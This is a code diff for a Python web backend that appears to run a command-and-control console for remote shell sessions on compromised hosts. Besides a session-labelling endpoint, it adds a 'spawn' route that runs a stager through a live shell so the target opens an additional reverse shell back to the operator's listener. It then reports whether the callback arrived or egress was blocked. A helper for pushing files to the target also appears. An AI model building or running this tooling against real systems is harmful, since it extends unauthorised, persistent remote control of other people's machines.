@@ -94,6 +94,17 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
             items = [s for s in items if s.host_ip == host]
         return [s.info() for s in items]
 
+    @app.patch("/api/sessions/{session_id}")
+    def patch_session(session_id: str, body: dict = Body()):
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        if "label" in body:
+            sess.label = str(body["label"])[:80]
+            mgr._save(sess)
+            broker.publish({"type": "session", "event": "label", "id": sess.id})
+        return sess.info()
+
     @app.get("/api/sessions/{session_id}/transcript")
     def transcript(session_id: str):
         sess = mgr.get(session_id)
@@ -144,6 +155,34 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
             await asyncio.sleep(0.5)
         return {"ok": True, "upgraded": False, "callback": cb,
                 "reason": f"stager launched but didn't call back — egress to {cb} may be blocked"}
+
+    @app.post("/api/sessions/{session_id}/spawn")
+    async def spawn(session_id: str):
+        """Spawn an additional independent session on the same host from an existing
+        live shell — runs the stager in the background so both sessions coexist."""
+        import asyncio
+        import uuid
+        from ...sessions.stagers import upgrade_command
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        if not sess.connected:
+            raise HTTPException(409, "shell is not currently connected")
+        if not sess.local_addr or not sess.local_addr[1]:
+            raise HTTPException(409, "cannot determine a callback address for this shell")
+        lhost, port = sess.local_addr
+        token = "sp_" + uuid.uuid4().hex[:12]
+        out = await sess.run_and_capture(upgrade_command(lhost, port, token).encode(), timeout=6.0)
+        cb = f"{lhost}:{port}"
+        if b"RECCE_NO_METHOD" in out:
+            return {"ok": False, "reason": "no python or bash on the target"}
+        for _ in range(20):
+            new = next((s for s in mgr.sessions.values()
+                        if s.token == token and s.status == "live"), None)
+            if new:
+                return {"ok": True, "session_id": new.id, "pty": new.pty, "callback": cb}
+            await asyncio.sleep(0.5)
+        return {"ok": False, "reason": f"stager launched but didn't call back — egress to {cb} may be blocked"}
 
     async def _push_file(sess, remote_path: str, data: bytes) -> None:
         """Write bytes to a file on the target through the shell, chunked so no single line
